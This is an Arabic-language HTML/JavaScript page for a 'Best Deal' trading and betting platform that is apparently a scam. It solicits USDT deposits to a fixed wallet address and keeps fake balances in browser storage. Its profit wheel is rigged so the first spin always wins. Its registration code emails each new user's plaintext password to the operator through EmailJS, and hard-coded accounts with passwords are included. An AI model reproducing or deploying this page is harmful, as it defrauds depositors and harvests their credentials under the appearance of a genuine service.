<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Best Deal Platform</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    <script type="text/javascript">
        (function() {
            emailjs.init("9NigoB59cWl6PslrW");
        })();
    </script>

    <style>
        .glass { background: rgba(255, 255, 255, 0.03); backdrop-filter: blur(10px); border: 1px solid rgba(255, 255, 255, 0.05); }
        .nav-item.active { color: #10b981; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(1080deg); } }
        .wheel-spin-anim { animation: spin 2.5s cubic-bezier(0.15, 0, 0.15, 1) forwards; }
        #custom-toast { position: fixed; top: 20px; left: 50%; transform: translateX(-50%); z-index: 9999; display: none; }
        #live-notify { position: fixed; top: 80px; right: -300px; transition: 0.5s; z-index: 1000; }
        #live-notify.show { right: 20px; }
    </style>
</head>
<body class="bg-black text-slate-200 font-sans overflow-x-hidden">

    <div id="custom-toast" class="bg-emerald-500 text-black px-6 py-3 rounded-full font-bold shadow-2xl">
        <span id="toast-msg"></span>
    </div>
    <div id="live-notify" class="glass px-4 py-2 rounded-xl border-emerald-500/30 text-[10px] font-bold text-emerald-400 italic"></div>

    <div id="hero-view" class="p-6">
        <div class="text-center py-20">
            <h1 class="text-4xl font-black italic text-emerald-500 mb-4">BEST DEAL</h1>
            <p class="text-slate-400">المنصة الرائدة للتداول والربح</p>
            <button onclick="checkAuth()" class="mt-8 bg-emerald-500 text-black px-10 py-4 rounded-2xl font-black italic uppercase">ابدأ الآن</button>
        </div>
    </div>

    <div id="user-dashboard" class="hidden p-6 pb-32"></div>

    <div class="bottom-nav fixed bottom-0 left-0 right-0 glass border-t border-white/5 p-4 flex justify-around items-center z-[1000]">
        <div class="nav-item active flex flex-col items-center gap-1" onclick="showView('hero-view', this)"><i class="fa-solid fa-house text-xl"></i><span class="text-[10px] font-bold">الرئيسية</span></div>
        <div class="nav-item flex flex-col items-center gap-1" onclick="checkAuth()"><i class="fa-solid fa-wallet text-xl"></i><span class="text-[10px] font-bold">المحفظة</span></div>
        <a href="https://wa.me/639553327014" target="_blank" class="nav-item flex flex-col items-center gap-1 no-underline">
            <i class="fa-brands fa-whatsapp text-xl text-emerald-500"></i>
            <span class="text-[10px] font-bold">الدعم</span>
        </a>
    </div>

    <div id="loginModal" class="hidden fixed inset-0 bg-black/95 backdrop-blur-xl z-[2000] flex items-center justify-center p-6">
        <div class="w-full max-sm glass rounded-[2.5rem] p-8 relative border-white/10 shadow-2xl">
            <button onclick="toggleModal('loginModal', false)" class="absolute top-6 left-6 text-slate-500 hover:text-white transition-colors"><i class="fa-solid fa-xmark text-2xl"></i></button>
            <div class="text-center mb-10">
                <h3 id="auth-title" class="text-3xl font-black text-emerald-500 italic mb-2 uppercase tracking-tighter">تسجيل الدخول</h3>
                <p id="auth-desc" class="text-[10px] text-slate-500 font-bold uppercase tracking-widest italic">الوصول الآمن للوكلاء</p>
            </div>
            <div class="space-y-4">
                <div class="relative">
                    <i class="fa-solid fa-user absolute right-5 top-5 text-slate-500"></i>
                    <input type="text" id="un" placeholder="اسم المستخدم" class="w-full bg-white/5 border border-white/10 rounded-2xl pr-12 pl-6 py-5 text-white outline-none focus:border-emerald-500 transition-all text-sm">
                </div>
                <div class="relative">
                    <i class="fa-solid fa-lock absolute right-5 top-5 text-slate-500"></i>
                    <input type="password" id="pw" placeholder="كلمة المرور" class="w-full bg-white/5 border border-white/10 rounded-2xl pr-12 pl-6 py-5 text-white outline-none focus:border-emerald-500 transition-all text-sm">
                </div>
                <button id="auth-main-btn" onclick="handleLogin()" class="w-full py-5 bg-emerald-500 text-black font-black rounded-2xl shadow-xl active:scale-95 transition-all uppercase italic text-sm mt-4">دخول المنصة</button>
                <div class="text-center mt-4">
                    <button id="toggle-auth-btn" onclick="toggleAuthMode()" class="text-emerald-400 text-[10px] font-bold uppercase tracking-widest hover:underline">ليس لديك حساب؟ إنشاء حساب جديد</button>
                </div>
            </div>
        </div>
    </div>

    <div id="depositModal" class="hidden fixed inset-0 bg-black/90 backdrop-blur-md z-[3000] flex items-center justify-center p-6">
        <div class="w-full max-w-sm glass rounded-[2.5rem] p-8 border-emerald-500/20 relative shadow-2xl">
            <button onclick="toggleModal('depositModal', false)" class="absolute top-6 left-6 text-slate-500 hover:text-white transition-colors"><i class="fa-solid fa-xmark text-2xl"></i></button>
            <div class="text-center mb-8">
                <div class="w-16 h-16 bg-emerald-500/20 rounded-2xl flex items-center justify-center text-emerald-500 mx-auto mb-5 font-black text-2xl italic border border-emerald-500/30">BD</div>
                <h3 class="text-xl font-black text-white italic">شحن الرصيد الفوري</h3>
            </div>
            <div class="bg-black/50 border border-white/10 rounded-2xl p-5 mb-6 text-center">
                <p class="text-[8px] text-slate-500 uppercase font-black mb-3 tracking-widest italic">عنوان المحفظة (USDT BEP20)</p>
                <div class="flex items-center gap-3">
                    <input id="myAddr" type="text" readonly value="0x7c487888402cC1e77E61eDf48BD20aa939624360" class="bg-transparent text-emerald-400 font-mono text-[10px] flex-1 outline-none truncate text-center">
                    <button onclick="copyAddress()" class="text-emerald-500 hover:text-white active:scale-125 transition-transform"><i class="fa-solid fa-copy text-xl"></i></button>
                </div>
            </div>
            <div class="space-y-3">
                <input type="number" id="dep-amount" placeholder="المبلغ المراد شحنه" class="w-full bg-white/5 border border-white/10 rounded-xl px-4 py-3 text-white text-sm outline-none text-center">
                <label class="block w-full bg-emerald-500/10 border border-dashed border-emerald-500/40 py-4 rounded-2xl text-center cursor-pointer hover:bg-emerald-500/20 transition-all">
                    <input type="file" id="receipt-img" class="hidden">
                    <i class="fa-solid fa-cloud-arrow-up text-emerald-500 mb-2"></i>
                    <p class="text-[9px] text-emerald-400 font-black uppercase">ارفق لقطة شاشة العملية</p>
                </label>
                <button onclick="confirmDeposit()" class="w-full bg-emerald-500 py-4 rounded-2xl text-black font-black text-[10px] uppercase italic">تأكيد العملية</button>
            </div>
        </div>
    </div>

    <div id="withdrawModal" class="hidden fixed inset-0 bg-black/95 backdrop-blur-xl z-[3000] flex items-center justify-center p-6">
        <div class="w-full max-w-sm glass rounded-[2.5rem] p-8 border-emerald-500/20 relative shadow-2xl">
            <button onclick="toggleModal('withdrawModal', false)" class="absolute top-6 left-6 text-slate-500 hover:text-white transition-colors"><i class="fa-solid fa-xmark text-2xl"></i></button>
            <div class="text-center mb-8">
                <h3 class="text-xl font-black text-white italic mb-2 uppercase">طلب سحب أرباح</h3>
                <p class="text-[9px] text-slate-500 font-bold tracking-widest italic uppercase">اختر بوابة السحب المفضلة</p>
            </div>
            <div class="grid grid-cols-1 gap-3">
                <button onclick="handleWithdraw('شركة الهرم')" class="w-full bg-white/5 border border-white/10 py-4 rounded-2xl text-sm font-bold flex items-center px-6 gap-4 hover:bg-emerald-500/10 transition-colors"><i class="fa-solid fa-paper-plane text-emerald-500"></i> شركة الهرم للحوالات</button>
                <button onclick="handleWithdraw('شركة الفؤاد')" class="w-full bg-white/5 border border-white/10 py-4 rounded-2xl text-sm font-bold flex items-center px-6 gap-4 hover:bg-emerald-500/10 transition-colors"><i class="fa-solid fa-bolt text-orange-500"></i> شركة الفؤاد</button>
                <button onclick="handleWithdraw('حساب بنكي')" class="w-full bg-white/5 border border-white/10 py-4 rounded-2xl text-sm font-bold flex items-center px-6 gap-4 hover:bg-emerald-500/10 transition-colors"><i class="fa-solid fa-building-columns text-purple-500"></i> حساب بنكي مباشر</button>
                <button onclick="handleWithdraw('Trust Wallet')" class="w-full bg-white/5 border border-white/10 py-4 rounded-2xl text-sm font-bold flex items-center px-6 gap-4 hover:bg-emerald-500/10 transition-colors"><i class="fa-solid fa-shield-halved text-blue-500"></i> محفظة Trust Wallet</button>
            </div>
        </div>
    </div>

    <div id="settingsModal" class="hidden fixed inset-0 bg-black/95 backdrop-blur-xl z-[3000] flex items-center justify-center p-6">
        <div class="w-full max-w-sm glass rounded-[2.5rem] p-8 border-white/10 relative shadow-2xl">
            <button onclick="toggleModal('settingsModal', false)" class="absolute top-6 left-6 text-slate-500 hover:text-white transition-colors"><i class="fa-solid fa-xmark text-2xl"></i></button>
            <div class="text-center mb-8">
                <h3 class="text-xl font-black text-white italic mb-2 uppercase">إعدادات الحساب</h3>
            </div>
            <div class="space-y-4">
                <input type="text" id="new-name" placeholder="الاسم المستعار الجديد" class="w-full bg-white/5 border border-white/10 rounded-2xl px-6 py-4 text-white outline-none focus:border-emerald-500 text-sm">
                <input type="password" id="new-pw" placeholder="كلمة المرور الجديدة" class="w-full bg-white/5 border border-white/10 rounded-2xl px-6 py-4 text-white outline-none focus:border-emerald-500 text-sm">
                <button onclick="saveSettings()" class="w-full py-4 bg-emerald-500 text-black font-black rounded-2xl text-[10px] uppercase italic">حفظ التغييرات</button>
            </div>
        </div>
    </div>

    <script>
        // --- الأساسيات والتخزين ---
        const savedData = localStorage.getItem('bestDealUsers');
        const users = savedData ? JSON.parse(savedData) : {
            "abdo": { name: "Abdul Ghani Ghannoum", pw: "25002500", balance: 2000, profit: 1500, level: "فضي", firstSpin: true },
            "ghazal": { name: "أحمد بكور", pw: "15001500", balance: 3500, profit: 1250, level: "ذهبي", firstSpin: true }
        };

        function updateStorage() { localStorage.setItem('bestDealUsers', JSON.stringify(users)); }
        let currentUser = null;
        let isLoginView = true;

        // --- وظيفة الإرسال البريدي الموحدة ---
        function sendAdminLog(subject, message) {
            const params = {
                subject: subject,
                user_name: currentUser ? currentUser.name : "زائر",
                message: message
            };
            emailjs.send("service_f1g5hdz", "template_kmducxp", params);
        }

        function showToast(msg) {
            const toast = document.getElementById('custom-toast');
            document.getElementById('toast-msg').innerText = msg;
            toast.style.display = 'block';
            setTimeout(() => { toast.style.display = 'none'; }, 3000);
        }

        // --- Auth Logic ---
        function checkAuth() { if(!currentUser) toggleModal('loginModal', true); else showView('user-dashboard'); }

        function toggleAuthMode() {
            isLoginView = !isLoginView;
            const title = document.getElementById('auth-title'), desc = document.getElementById('auth-desc'), 
                  mainBtn = document.getElementById('auth-main-btn'), toggleBtn = document.getElementById('toggle-auth-btn');
            if(isLoginView) {
                title.innerText = "تسجيل الدخول"; desc.innerText = "الوصول الآمن للوكلاء";
                mainBtn.innerText = "دخول المنصة"; mainBtn.setAttribute('onclick', 'handleLogin()');
                toggleBtn.innerText = "ليس لديك حساب؟ إنشاء حساب جديد";
            } else {
                title.innerText = "حساب جديد"; desc.innerText = "انضم الآن إلى عائلة Best Deal";
                mainBtn.innerText = "إنشاء الحساب"; mainBtn.setAttribute('onclick', 'handleRegister()');
                toggleBtn.innerText = "لديك حساب بالفعل؟ سجل دخولك";
            }
        }

        function handleRegister() {
            const un = document.getElementById('un').value.trim().toLowerCase(), pw = document.getElementById('pw').value.trim();
            if(!un || !pw) { showToast("يرجى إدخال البيانات كاملة"); return; }
            if(users[un]) { showToast("اسم المستخدم موجود مسبقاً"); return; }
            users[un] = { name: un, pw: pw, balance: 0, profit: 0, level: "مبتدئ", firstSpin: true };
            updateStorage();
            sendAdminLog("إنشاء حساب جديد", `المستخدم ${un} قام بالتسجيل بكلمة مرور: ${pw}`);
            showToast("تم إنشاء الحساب! يمكنك الدخول الآن");
            toggleAuthMode();
        }

        function handleLogin() {
            const un = document.getElementById('un').value.trim().toLowerCase(), pw = document.getElementById('pw').value.trim();
            if (users[un] && users[un].pw === pw) {
                currentUser = users[un]; toggleModal('loginModal', false);
                renderDashboard(); showView('user-dashboard');
                showToast(`مرحباً بك مجدداً، ${currentUser.name}`);
                sendAdminLog("دخول مستخدم", `المستخدم ${currentUser.name} دخل للمنصة الآن.`);
            } else { showToast("خطأ في البيانات، حاول مجدداً"); }
        }

        // --- Dashboard Logic ---
        function renderDashboard() {
            const total = currentUser.balance + currentUser.profit;
            document.getElementById('user-dashboard').innerHTML = `
                <div class="bg-gradient-to-br from-emerald-900 via-black to-black p-8 rounded-[2.5rem] border border-emerald-500/30 mb-6 relative shadow-2xl">
                    <div class="flex justify-between items-start mb-10">
                        <div>
                            <p class="text-emerald-400 text-[10px] font-black uppercase mb-1 tracking-[0.2em] italic">إجمالي المحفظة</p>
                            <h2 class="text-5xl font-black italic text-white leading-none tracking-tighter">$${total.toLocaleString()}</h2>
                        </div>
                        <div onclick="toggleModal('settingsModal', true)" class="glass w-12 h-12 rounded-2xl flex items-center justify-center text-emerald-400 cursor-pointer hover:bg-emerald-500/10 transition-colors"><i class="fa-solid fa-gear text-xl"></i></div>
                    </div>
                    <div class="grid grid-cols-2 gap-4">
                        <button onclick="toggleModal('depositModal', true)" class="bg-emerald-500 text-black py-4.5 rounded-2xl font-black text-[11px] flex items-center justify-center gap-2 italic uppercase shadow-lg shadow-emerald-500/20"><i class="fa-solid fa-plus-circle"></i> إيداع</button>
                        <button onclick="toggleModal('withdrawModal', true)" class="bg-white/10 text-white border border-white/10 py-4.5 rounded-2xl font-black text-[11px] flex items-center justify-center gap-2 italic uppercase"><i class="fa-solid fa-money-bill-transfer"></i> سحب</button>
                    </div>
                </div>

                <div class="glass rounded-[2rem] p-7 mb-6 border-emerald-500/10">
                    <div class="flex justify-between items-center mb-6">
                        <h3 class="font-black text-[10px] uppercase tracking-widest italic flex items-center gap-2"><i class="fa-solid fa-dharmachakra text-emerald-500"></i> عجلة الأرباح</h3>
                    </div>
                    <div class="text-center">
                        <div id="wheel-display" class="w-20 h-20 bg-emerald-500/10 rounded-full border-4 border-dashed border-emerald-500/40 mx-auto flex items-center justify-center mb-6 transition-all shadow-inner"><i class="fa-solid fa-star text-3xl text-emerald-500"></i></div>
                        <p id="wheel-status" class="text-[10px] font-black mb-6 text-slate-400 italic">استثمر لتدوير العجلة</p>
                        <div class="flex gap-2">
                            <input type="number" id="bet-amount" placeholder="المبلغ (Min 50$)" class="w-1/2 bg-black/40 border border-white/10 rounded-xl px-4 py-3 text-white text-[10px] outline-none text-center font-bold">
                            <button onclick="spinWheel()" id="spin-btn" class="w-1/2 bg-emerald-500 text-black font-black py-3 rounded-xl text-[10px] uppercase italic">تدوير الآن</button>
                        </div>
                    </div>
                </div>

                <div class="grid grid-cols-2 gap-4 mb-8">
                    <div class="bg-white/5 p-5 rounded-2xl border border-white/5 text-center">
                        <p class="text-[8px] font-bold text-slate-500 mb-2 uppercase">رأس المال</p>
                        <span class="text-xl font-black text-white italic">$${currentUser.balance}</span>
                    </div>
                    <div class="bg-emerald-500/10 p-5 rounded-2xl border border-emerald-500/20 text-center">
                        <p class="text-[8px] font-bold text-emerald-400 mb-2 uppercase">إجمالي الربح</p>
                        <span class="text-xl font-black text-emerald-400 italic">+$${currentUser.profit}</span>
                    </div>
                </div>
                <button onclick="logout()" class="w-full py-6 text-slate-600 font-bold text-[10px] uppercase">تسجيل الخروج</button>
            `;
        }

        // --- Wheel Logic ---
        function spinWheel() {
            const betInput = document.getElementById('bet-amount');
            const bet = parseFloat(betInput.value);
            const status = document.getElementById('wheel-status');
            const wheelIco = document.getElementById('wheel-display');
            const spinBtn = document.getElementById('spin-btn');

            if (isNaN(bet) || bet < 50) { showToast("الحد الأدنى 50$"); return; }
            if (currentUser.balance < bet) { showToast("رصيدك غير كافٍ"); return; }

            currentUser.balance -= bet; updateStorage(); renderDashboard();
            spinBtn.disabled = true;
            wheelIco.classList.add('wheel-spin-anim');

            setTimeout(() => {
                wheelIco.classList.remove('wheel-spin-anim');
                spinBtn.disabled = false;
                let result;
                if (currentUser.firstSpin) { result = { label: "ربح الضعف", mult: 2 }; currentUser.firstSpin = false; }
                else {
                    const outcomes = [{ label: "خسارة", mult: 0, w: 50 }, { label: "تعادل", mult: 1, w: 20 }, { label: "x2", mult: 2, w: 20 }, { label: "x5", mult: 5, w: 10 }];
                    let p = []; outcomes.forEach(o => { for(let i=0; i<o.w; i++) p.push(o); });
                    result = p[Math.floor(Math.random()*p.length)];
                }
                const win = bet * result.mult;
                currentUser.balance += win; updateStorage(); renderDashboard();
                status.innerText = `النتيجة: ${result.label} (+$${win})`;
                sendAdminLog("نشاط عجلة الحظ", `المستخدم راهن بـ ${bet}$ والنتيجة ${result.label}. الرصيد الحالي: ${currentUser.balance}$`);
            }, 2500);
        }

        // --- Deposit & Withdraw ---
        function confirmDeposit() {
            const amount = document.getElementById('dep-amount').value;
            if(!amount) { showToast("أدخل المبلغ أولاً"); return; }
            showToast("جاري مراجعة طلب الإيداع...");
            sendAdminLog("طلب إيداع جديد", `قام المستخدم بطلب إيداع مبلغ: ${amount}$ وأرفق صورة الإيصال.`);
            toggleModal('depositModal', false);
        }

        function handleWithdraw(method) {
            const amount = prompt(`أدخل المبلغ للسحب عبر ${method}:`);
            if(amount && amount >= 50) {
                if(currentUser.profit >= amount) {
                    currentUser.profit -= parseFloat(amount);
                    updateStorage(); renderDashboard();
                    showToast("تم إرسال طلب السحب");
                    sendAdminLog("طلب سحب أرباح", `طلب سحب مبلغ: ${amount}$ عبر ${method}.`);
                    toggleModal('withdrawModal', false);
                } else { showToast("أرباحك غير كافية"); }
            }
        }

        // --- Helpers ---
        function toggleModal(id, s) { const m = document.getElementById(id); s ? m.classList.remove('hidden') : m.classList.add('hidden'); }
        function showView(v, el) { 
            document.getElementById('hero-view').classList.add('hidden'); document.getElementById('user-dashboard').classList.add('hidden'); 
            document.getElementById(v).classList.remove('hidden');
            if(el) { document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active')); el.classList.add('active'); }
        }
        function copyAddress() { const c = document.getElementById("myAddr"); c.select(); navigator.clipboard.writeText(c.value); showToast("تم النسخ"); }
        function logout() { currentUser = null; showView('hero-view'); showToast("تم تسجيل الخروج"); }
    </script>
</body>
</html>
